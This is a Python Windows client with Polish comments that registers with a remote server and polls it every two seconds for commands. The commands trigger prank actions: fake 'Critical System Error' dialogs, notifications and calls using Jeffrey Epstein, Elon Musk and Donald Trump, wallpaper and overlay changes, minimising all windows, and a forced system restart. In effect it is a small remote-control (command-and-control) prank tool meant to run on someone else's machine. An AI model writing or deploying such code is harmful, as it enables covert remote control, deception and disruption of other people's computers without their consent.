import socket
import time
import ctypes
import overlay
import music
from config import tapeta11, tapeta2, barka, tapeta12, tapeta13, Epstine_img
import epstine
import os
import powiadomienia
import epstinecall
import cdroom
import webbrowser
import random
import winsound
import subprocess
import requests
import uuid
from plyer import notification

# Wygeneruj unikalny ID dla tego klienta
CLIENT_ID = str(uuid.uuid4())
SERVER_URL = "https://twój-serwer.onrender.com"  # Zmień na swój URL Render
final_name = "Windows_Client"

def hide_all_windows():
    ctypes.windll.user32.keybd_event(0x5B, 0, 0, 0)
    ctypes.windll.user32.keybd_event(0x44, 0, 0, 0)
    ctypes.windll.user32.keybd_event(0x44, 0, 2, 0)
    ctypes.windll.user32.keybd_event(0x5B, 0, 2, 0)

def set_default_wallpaper():
    default_wallpaper = r"C:\Windows\Web\Wallpaper\Windows\img0.jpg"
    if os.path.exists(default_wallpaper):
        ctypes.windll.user32.SystemParametersInfoW(20, 0, default_wallpaper, 3)
        print("Przywrócono domyślną tapetę Windows.")
    else:
        print("Nie znaleziono domyślnej tapety Windows.")

def set_wallpaper(path):
    if not os.path.exists(path):
        print(f"Brak tapety: {path}")
        return
    ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
    print(f"Tapeta ustawiona: {path}")

def start():
    hide_all_windows()
    music.play_music(barka)
    overlay.start_overlay()
    set_wallpaper(tapeta11)

def stop():
    music.stop_music()
    overlay.stop_overlay()
    set_default_wallpaper()

def przylece():
    print("Otwieranie strony w nowym oknie...")
    url = "https://www.youtube.com/watch?v=COjRbZg-eKc"
    webbrowser.open_new(url)

def play_error_sound():
    winsound.PlaySound("SystemHand", winsound.SND_ALIAS)

def fake_virus_alert():
    ctypes.windll.user32.MessageBoxW(
        0,
        "System Alert",
        "Critical System Error Detected!",
        0x10
    )

def restart():
    subprocess.run(['shutdown', '/r', '/t', '10', '/c', "System windows wymaga restartu komputera. Komputer zostanie uruchomiony ponownie za 10 sekund."])

def system_notification(title, message, timeout=5):
    try:
        notification.notify(
            title=title,
            message=message,
            timeout=timeout,
            app_name="Windows Program",
        )
        return True
    except Exception as e:
        print(f"Błąd powiadomienia: {e}")
        return False

def register_client():
    """Rejestruje klienta na serwerze"""
    try:
        response = requests.post(f"{SERVER_URL}/api/register", 
                                json={"id": CLIENT_ID, "name": final_name},
                                timeout=5)
        if response.status_code == 200:
            print(f"Zarejestrowano klienta: {CLIENT_ID}")
            return True
    except Exception as e:
        print(f"Błąd rejestracji: {e}")
    return False

def get_command():
    """Pobiera komendę z serwera"""
    try:
        response = requests.post(f"{SERVER_URL}/api/get_command",
                                json={"id": CLIENT_ID},
                                timeout=5)
        if response.status_code == 200:
            data = response.json()
            return data.get("command")
    except Exception as e:
        print(f"Błąd pobierania komendy: {e}")
    return None

def execute_command(cmd):
    """Wykonuje komendę otrzymaną z serwera"""
    if cmd is None:
        return
    
    print(f"Wykonuję komendę: {cmd}")
    
    if cmd == "start":
        start()
    elif cmd == "stop":
        stop()
    elif cmd == "epstine":
        epstine.start_epstine_start_in_background()
    elif cmd == "stopepstine":
        epstine.epstinestop()
    elif cmd == "hideallwindows":
        hide_all_windows()
    elif cmd == "call elon musk":
        epstinecall.epstinecall("Elon Musk", tapeta13)
    elif cmd == "call donald trump":
        epstinecall.epstinecall("Donald Trump", tapeta12)
    elif cmd == "call epstine":
        epstinecall.epstinecall("Jeffrey Epstein", Epstine_img)
    elif cmd == "powiadomienie epstine":
        powiadomienia.show_custom_notification(
            title=" ",
            message="",
            buttons=[
                {"text": "Udaj się na wyspe", "command": przylece}
            ]
        )
    elif cmd == "fake virus alert":
        fake_virus_alert()
    elif cmd == "powiadomienie test":
        system_notification("Witaj", "Otrzymałeś zaproszenie do grona znajomych od użytkownika Jeffry Epstine", 10)
    elif cmd == "restart":
        restart()
    elif cmd == "error sound":
        play_error_sound()
    else:
        print(f"Nieznana komenda: {cmd}")

if __name__ == "__main__":
    print(f"=== Client ID: {CLIENT_ID} ===")
    print(f"=== Server: {SERVER_URL} ===")
    
    # Rejestracja klienta
    if register_client():
        print("Rejestracja udana. Rozpoczynam nasłuchiwanie komend...")
        
        while True:
            try:
                # Pobierz komendę z serwera
                command = get_command()
                
                # Jeśli jest komenda, wykonaj ją
                if command:
                    execute_command(command)
                
                # Poczekaj przed kolejnym sprawdzeniem
                time.sleep(2)
                
            except KeyboardInterrupt:
                print("Zatrzymywanie klienta...")
                stop()
                break
            except Exception as e:
                print(f"Błąd w pętli głównej: {e}")
                time.sleep(5)
    else:
        print("Nie udało się zarejestrować na serwerze. Spróbuj ponownie później.")